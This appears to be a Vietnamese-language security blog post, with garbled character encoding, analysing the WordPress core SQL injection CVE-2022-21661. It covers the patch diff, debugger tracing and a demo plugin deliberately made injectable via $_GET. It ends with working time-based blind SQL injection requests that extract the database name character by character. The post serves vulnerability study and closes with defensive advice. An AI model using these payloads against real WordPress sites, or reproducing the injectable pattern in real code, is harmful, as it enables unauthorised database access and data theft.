l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2.\nVSCode Extensions WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:\nPHP Extension Pack =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode Custom Plugin V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query.\nTa x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request.\n\u0026lt;?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined(\u0026#39;ABSPATH\u0026#39;)) exit; function da_show_posts() { $args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [1,2,3], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; $query = new WP_Query($args); ob_start(); echo \u0026#39;\u0026lt;h3\u0026gt;Demo WP_Query\u0026lt;/h3\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;pre style=\u0026#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;SQL query generated by WP_Query:\\n\\n\u0026#34;; echo esc_html($query-\u0026gt;request); // Display excuted query echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($query-\u0026gt;have_posts()) { echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; while ($query-\u0026gt;have_posts()) { $query-\u0026gt;the_post(); echo \u0026#39;\u0026lt;li\u0026gt;\u0026#39; . get_the_title() . \u0026#39; (\u0026#39; . get_the_ID() . \u0026#39;)\u0026lt;/li\u0026gt;\u0026#39;; } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;p\u0026gt;No posts found.\u0026lt;/p\u0026gt;\u0026#39;; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode(\u0026#39;demo_wp_query\u0026#39;, \u0026#39;da_show_posts\u0026#39;); Taxonomy parameters\nT·∫°o page m·ªõi v·ªõi \u0026lt;page-title\u0026gt; c√≥ shortcode :\n[demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;\nAnalysis wpdb\nL√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query\nL√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá\nWP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. Patch Diff WordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.\nTrong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub:\nL·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php\nB·∫£n l·ªói\n$query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); √âp $query['terms'] th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p. Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL. V√≠ d·ª•:\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;1) AND (SELECT SLEEP(5)) # \u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; B·∫£n v√°\nif ( \u0026#39;slug\u0026#39; === $query[\u0026#39;field\u0026#39;] || \u0026#39;name\u0026#39; === $query[\u0026#39;field\u0026#39;] ) { $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); } else { $query[\u0026#39;terms\u0026#39;] = wp_parse_id_list( $query[\u0026#39;terms\u0026#39;] ); } B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o $query['field']: N·∫øu l√† slug ho·∫∑c name =\u0026gt; gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©. N·∫øu l√† ID =\u0026gt; d√πng wp_parse_id_list() ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n. Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong tax_query1, tham s·ªë field ch·ªâ nh·∫≠n 4 gi√° tr·ªã: slug, name, term_taxonomy_id v√† term_id. Trong ƒë√≥, hai tr∆∞·ªùng term_taxonomy_id v√† term_id thu·ªôc b·∫£ng wp_term_taxonomy v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu BIGINT UNSIGNED. {: .prompt-tip }\nmysql\u0026gt; DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) How it work? V·ªã tr√≠ l·ªó h·ªïng n·∫±m trong h√†m clean_query c·ªßa class WP_Tax_Query thu·ªôc file src/wp-includes/class-wp-tax-query.php\nprivate function clean_query( \u0026amp;$query ) { if ( empty( $query[\u0026#39;taxonomy\u0026#39;] ) ) { if ( \u0026#39;term_taxonomy_id\u0026#39; !== $query[\u0026#39;field\u0026#39;] ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } // So long as there are shared terms, \u0026#39;include_children\u0026#39; requires that a taxonomy is set. $query[\u0026#39;include_children\u0026#39;] = false; } elseif ( ! taxonomy_exists( $query[\u0026#39;taxonomy\u0026#39;] ) ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); // \u0026lt;== Vulnerability location if ( is_taxonomy_hierarchical( $query[\u0026#39;taxonomy\u0026#39;] ) \u0026amp;\u0026amp; $query[\u0026#39;include_children\u0026#39;] ) { $this-\u0026gt;transform_query( $query, \u0026#39;term_id\u0026#39; ); if ( is_wp_error( $query ) ) { return; } $children = array(); foreach ( $query[\u0026#39;terms\u0026#39;] as $term ) { $children = array_merge( $children, get_term_children( $term, $query[\u0026#39;taxonomy\u0026#39;] ) ); $children[] = $term; } $query[\u0026#39;terms\u0026#39;] = $children; } $this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nTrong h√†m clean_query, tham s·ªë $query ƒë∆∞·ª£c truy·ªÅn theo tham chi·∫øu (c√≥ d·∫•u \u0026amp;). Do ƒë√≥, m·ªçi thay ƒë·ªïi tr√™n bi·∫øn $query b√™n trong h√†m s·∫Ω t√°c ƒë·ªông tr·ª±c ti·∫øp ƒë·∫øn bi·∫øn $query g·ªëc ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ b√™n ngo√†i.\nPayload ƒë∆∞·ª£c truy·ªÅn v√†o th√¥ng qua $query['terms']. Trong h√†m clean_query, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l√†m s·∫°ch.\nüëâ V√¨ v·∫≠y, ƒë·ªÉ khai th√°c th√†nh c√¥ng, payload trong $query['terms'] c·∫ßn v∆∞·ª£t qua to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra v√† l·ªçc c·ªßa clean_query tr∆∞·ªõc khi ƒë·∫øn b∆∞·ªõc th·ª±c thi SQL.\nDebugging Do logic c·ªßa WordPress Core kh√° ph·ª©c t·∫°p, ta c·∫ßn s·ª≠ d·ª•ng debugger ƒë·ªÉ ph√¢n t√≠ch. ƒê·∫∑t breakpoint t·∫°i ƒë·∫ßu h√†m clean_query, sau ƒë√≥ nh·∫•n F5 ƒë·ªÉ b·∫Øt ƒë·∫ßu debug.\nKhi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;, debugger s·∫Ω d·ª´ng t·∫°i h√†m clean_query.\nL·∫ßn ƒë·∫ßu, WordPress th·ª±c hi·ªán query v·ªõi taxonomy = wp_theme (kh√¥ng ph·∫£i gi√° tr·ªã ta truy·ªÅn v√†o). Nh·∫•n F5 th√™m m·ªôt l·∫ßn ƒë·ªÉ b·ªè qua, debugger s·∫Ω ƒë·∫øn query c√≥ taxonomy kh·ªõp v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o.\nV√¨ $query['taxonomy'] t·ªìn t·∫°i n√™n truy v·∫•n v∆∞·ª£t qua c√°c nh√°nh if/elseif ban ƒë·∫ßu trong clean_query. Ti·∫øp t·ª•c debug, ƒëi·ªÅu ki·ªán k·∫ø ti·∫øp ƒë∆∞·ª£c th·ªèa m√£n =\u0026gt; ta nh·∫£y v√†o h√†m transform_query v·ªõi tham s·ªë:\n$query (tham chi·∫øu t·ªõi query hi·ªán t·∫°i) $resulting_field = 'term_id' (gi√° tr·ªã fix c·ª©ng) Nh·∫•n F11 ƒë·ªÉ step into v√†o transform_query.\npublic function transform_query( \u0026amp;$query, $resulting_field ) { // other logic if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } // Empty \u0026#39;terms\u0026#39; always results in a null transformation. // other logic $args = array( \u0026#39;get\u0026#39; =\u0026gt; \u0026#39;all\u0026#39;, \u0026#39;number\u0026#39; =\u0026gt; 0, \u0026#39;taxonomy\u0026#39; =\u0026gt; $query[\u0026#39;taxonomy\u0026#39;], \u0026#39;update_term_meta_cache\u0026#39; =\u0026gt; false, \u0026#39;orderby\u0026#39; =\u0026gt; \u0026#39;none\u0026#39;, ); // Term query parameter name depends on the \u0026#39;field\u0026#39; being searched on. switch ( $query[\u0026#39;field\u0026#39;] ) { case \u0026#39;slug\u0026#39;: break; // other logic default: $args[\u0026#39;include\u0026#39;] = wp_parse_id_list( $terms ); break; } $term_query = new WP_Term_Query(); $term_list = $term_query-\u0026gt;query( $args ); if ( is_wp_error( $term_list ) ) { $query = $term_list; return; } // other logic $query[\u0026#39;terms\u0026#39;] = wp_list_pluck( $term_list, $resulting_field ); $query[\u0026#39;field\u0026#39;] = $resulting_field; } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nT·∫°i ƒë√¢y, $query['terms'] b·ªã ghi ƒë√® b·ªüi k·∫øt qu·∫£ c·ªßa wp_list_pluck.\nüëâ Mu·ªën gi·ªØ nguy√™n payload trong $query['terms'], ta ph·∫£i tr√°nh ƒë·ªÉ n√≥ b·ªã g√°n l·∫°i. C√≥ 2 c√°ch:\nPh√¢n t√≠ch wp_list_pluck ƒë·ªÉ xem c√≥ l·ªó h·ªïng bypass. K·∫øt th√∫c s·ªõm transform_query b·∫±ng c√°ch l·ª£i d·ª•ng ƒëi·ªÅu ki·ªán (focus): if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } Trong h√†m clean_query, ·ªû l·∫ßn g·ªçi transform_query ƒë·∫ßu ti√™n, $resulting_field = 'term_id' (kh√°c v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o l√† 'term_taxonomy_id')\nTuy nhi√™n, ·ªü cu·ªëi clean_query, transform_query ƒë∆∞·ª£c g·ªçi l·∫°i v·ªõi:\n$this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); L√∫c n√†y, $resulting_field tr√πng kh·ªõp v·ªõi $query['field'] m√† ta truy·ªÅn v√†o ('term_taxonomy_id'), n√™n h√†m s·∫Ω return s·ªõm, kh√¥ng ghi ƒë√® $query['terms'].\nüëâ Ch·ªâ c·∫ßn b·ªè qua ƒëi·ªÅu ki·ªán if th·ª© 2 trong clean_query, th√¨ ƒë·∫øn cu·ªëi h√†m, transform_query() s·∫Ω return s·ªõm khi $resulting_field == $query['field']. Khi ƒë√≥, payload trong $query['terms'] v·∫´n nguy√™n v·∫πn, kh√¥ng b·ªã thay ƒë·ªïi.\nTa ch·ªâ c·∫ßn th√™m $query['include_children'] v·ªõi gi√° tr·ªã false th√¨ ƒëi·ªÅu ki·ªán if s·∫Ω kh√¥ng x·∫£y ra.\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;payload\u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, \u0026#39;include_children\u0026#39; =\u0026gt; false ], ], ]; Thay ƒë·ªïi $args trong plugin c·ªßa ta, t·∫Øt debugger sau ƒë√≥ truy c·∫≠p v√†o http://localhost/\u0026lt;page-title\u0026gt;, quan s√°t c√¢u query th·ª±c s·ª± nguy√™n v·∫πn.\nüëâ Th√†nh c√¥ng ki·ªÉm so√°t payload.\nFlow ƒê·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m, ta c·∫ßn ph√¢n t√≠ch callstack c·ªßa debugger.\nƒê·∫ßu ti√™n, ƒë·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o v·ªõi ƒë·ªëi s·ªë $args ch·ª©a terms do ta ki·ªÉm so√°t\n__construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi sau ƒë√≥ g·ªçi ƒë·∫øn h√†m query\nquery th·ª±c hi·ªán parse args v·ªõi ƒë·ªëi s·ªë $query sau ƒë√≥ g·ªçi h√†m get_posts\nget_posts ki·ªÉm tra c√¢u ƒëi·ªÅu ki·ªán v√† g·ªçi get_sql l√†m gi√° tr·ªã tr·∫£ v·ªÅ cho $clauses n·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng. Quan s√°t Variable \u0026gt; Local \u0026gt; $this(WP_Query) \u0026gt; is_singular b√™n debugger tab, is_singular c√≥ gi√° tr·ªã false n√™n c√¢u ƒëi·ªÅu ki·ªán ƒë√∫ng, get_sql ƒë∆∞·ª£c g·ªçi.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa get_sql_clauses\nget_sql_clauses g·ªçi ƒë·∫øn get_sql_for_query v·ªõi ƒë·ªëi s·ªë l√† tham chi·∫øu ƒë·∫øn $queries\nget_sql_for_query duy·ªát qua m·∫£ng $query ki·ªÉm tra c√°c $key, n·∫øu $key kh√¥ng ph·∫£i relation th√¨ ki·ªÉm tra ƒëi·ªÅu ki·ªán is_first_order_clause c·ªßa $claude\nN·∫øu $clause c√≥ 1 trong c√°c key sau:\n$keys = [\u0026#39;terms\u0026#39;, \u0026#39;taxonomy\u0026#39;, \u0026#39;include_children\u0026#39;, \u0026#39;field\u0026#39;, \u0026#39;operator\u0026#39;] Th√¨ get_sql_for_clause s·∫Ω ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $clause v√† $query\nget_sql_for_clause g·ªçi ƒë·∫øn clean_query ƒë·ªÉ l√†m s·∫°ch $clause, nh∆∞ng ta ƒë√£ bypass =\u0026gt; terms trong $clause kh√¥ng thay ƒë·ªïi.\n$where ƒë∆∞·ª£c g√°n gi√° tr·ªã ch·ª©a payload terms do ta ki·ªÉm so√°t, v√† ƒë∆∞·ª£c g√°n v√†o $sql tr·∫£ v·ªÅ.\n$sql['where'] ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã tr∆∞·ªõc khi tr·∫£ v·ªÅ.\nget_sql_for_query nh·∫≠n $sql tr·∫£ v·ªÅ t·ª´ get_sql_for_clause, th√™m () v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql_clauses\nget_sql_clauses th√™m AND v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã l·∫•y t·ª´ get_sql_clauses\nget_posts l·∫•y gi√° tr·ªã tr·∫£ v·ªÅ t·ª´ get_sql g√°n cho $clauses\n$where ƒë∆∞·ª£c concat v·ªõi gi√° tr·ªã $clauses['where']\nüëâ get_posts l√† h√†m ch√≠nh th·ª±c thi SQL query b·∫±ng $wpdb ƒë·ªÉ bi·∫øt c√¢u query ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢u, ta ƒë·∫∑t breakpoint t·∫°i n∆°i c√≥ $wpdb trong get_posts, quan s√°t $wpdb \u0026gt; last_query (ch·ª©a c√¢u l·ªánh th·ª±c thi g·∫ßn nh·∫•t) v√† li√™n t·ª•c F10 ƒë·ªÉ debugger ch·∫°y ƒë·∫øn n∆°i th·ª±c thi query.\nL·ªói \u0026quot;Unknown column 'payload' in 'where clause'\u0026quot; xu·∫•t hi·ªán t·∫°i tab debugger ch·ª©a n·ªôi dung c·ªßa payload\nüëâ $where ch·ª©a payload ƒë∆∞·ª£c th√™m v√†o $this-\u0026gt;request t·∫°i d√≤ng 3012 v√† th·ª±c thi t·∫°i d√≤ng 3026 b·∫±ng $wpdb-\u0026gt;get_col()\nChart\nExploit Ta t√πy ch·ªânh gi√° tr·ªã c·ªßa terms ƒë·ªÉ m√¥ ph·ªèng tr∆∞·ªùng h·ª£p terms truy·ªÅn v√†o c√≥ th·ªÉ ki·ªÉm so√°t b·ªüi attacker\n\u0026#39;terms\u0026#39; =\u0026gt; [$_GET[\u0026#39;terms\u0026#39;]], Detect SQLi Thay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 C·∫•u query th·ª±c s·ª±:\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) # ) ) AND wp_posts.post_type = \u0026#39;post\u0026#39; AND (wp_posts.post_status = \u0026#39;publish\u0026#39;) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nGi·∫£i th√≠ch k·ªπ thu·∫≠t (subquery trong m·ªánh ƒë·ªÅ FROM):\nPayload d√πng m·ªôt subquery trong m·ªánh ƒë·ªÅ FROM: FROM (SELECT SLEEP(5)) a. MySQL ph·∫£i th·ª±c thi truy v·∫•n con tr∆∞·ªõc, t·∫°o ra m·ªôt b·∫£ng t·∫°m t·ª´ k·∫øt qu·∫£ c·ªßa subquery, r·ªìi m·ªõi ti·∫øp t·ª•c th·ª±c thi truy v·∫•n ch√≠nh. SELECT SLEEP(5) s·∫Ω l√†m cho truy v·∫•n con ch·∫≠m 5 gi√¢y ‚Äî do ƒë√≥ th·ªùi gian tr·∫£ v·ªÅ c·ªßa c·∫£ truy v·∫•n tƒÉng t∆∞∆°ng ·ª©ng, cho th·∫•y payload ƒë∆∞·ª£c th·ª±c thi. L∆∞u √Ω v·ªÅ cache v√† s·ªë l∆∞·ª£ng h√†ng (rows):\nMySQL c√≥ th·ªÉ t·ªëi ∆∞u/cached m·ªôt s·ªë k·∫øt qu·∫£ con; trong tr∆∞·ªùng h·ª£p c·ª• th·ªÉ n√†y SELECT SLEEP(5) ch·ªâ c·∫ßn th·ª±c thi 1 l·∫ßn ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, n√™n th·∫•y ƒë√∫ng m·ªôt l·∫ßn ƒë·ªô tr·ªÖ. N·∫øu ph·∫ßn tr∆∞·ªõc c·ªßa bi·ªÉu th·ª©c AND tr·∫£ v·ªÅ nhi·ªÅu h√†ng v√† payload ƒë∆∞·ª£c l·ªìng theo c√°ch g√¢y l·∫∑p, th·ªùi gian tr·∫£ v·ªÅ c√≥ th·ªÉ tƒÉng theo c·∫•p s·ªë (t·ª©c l√† nh√¢n l√™n theo s·ªë h√†ng), d·∫´n t·ªõi ƒë·ªô tr·ªÖ l·ªõn h∆°n nhi·ªÅu ‚Äî v√¨ truy v·∫•n con c√≥ th·ªÉ b·ªã th·ª±c thi cho m·ªói h√†ng t√πy c√°ch optimizer x·ª≠ l√Ω truy v·∫•n. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nThay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),0))a)+%23+ HTTP/1.1 S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(w)\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nConclusion L·ªó h·ªïng CVE-2022-21661 trong WordPress Core tr∆∞·ªõc phi√™n b·∫£n 5.8.3, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query ƒë·ªÉ th·ª±c thi.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t WordPress v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nCVE-2022-21661 Detail Notes V√¨ patch n·∫±m trong file src/wp-includes/class-wp-tax-query.php File n√†y ƒë·ªãnh nghƒ©a class WP_Tax_Query, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë tax_query trong WP_Query. V√¨ th·∫ø, n·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh parse/validate c·ªßa tax_query.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"//localhost:1313/vi/posts/2025-09-15-cve-2022-21661/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eDo vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (\u003cstrong\u003esanitization\u003c/strong\u003e) kh√¥ng ƒë√∫ng c√°ch trong \u003ccode\u003eWP_Query\u003c/code\u003e, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra \u003cstrong\u003eSQL Injection\u003c/strong\u003e th√¥ng qua c√°c \u003cstrong\u003eplugin\u003c/strong\u003e ho·∫∑c \u003cstrong\u003etheme\u003c/strong\u003e s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n \u003cstrong\u003e5.8.3\u003c/strong\u003e. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n \u003cstrong\u003e3.7.37\u003c/strong\u003e.\u003c/p\u003e","title":"CVE-2022-21661"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ 